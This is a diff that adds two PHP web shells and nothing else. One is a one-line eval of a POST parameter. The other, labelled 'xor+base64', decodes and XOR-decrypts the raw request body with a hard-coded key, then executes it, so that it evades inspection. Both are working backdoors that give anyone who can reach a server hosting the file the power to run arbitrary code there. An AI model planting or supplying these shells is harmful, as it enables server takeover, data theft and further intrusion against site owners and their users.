@@ -1,0 +1,18 @@
+<?php @eval($_POST['xx']);?>
+
+# xor+base64
+<?php
+
+function Decrypt($data)
+{
+    $key="e45e329feb5d925b"; 
+    $bs="base64_"."decode";
+	$after=$bs($data."");
+	for($i=0;$i<strlen($after);$i++) {
+    	$after[$i] = $after[$i]^$key[$i+1&15]; 
+    }
+    return $after;
+}
+eval(Decrypt(file_get_contents("php://input")));
+
+?>
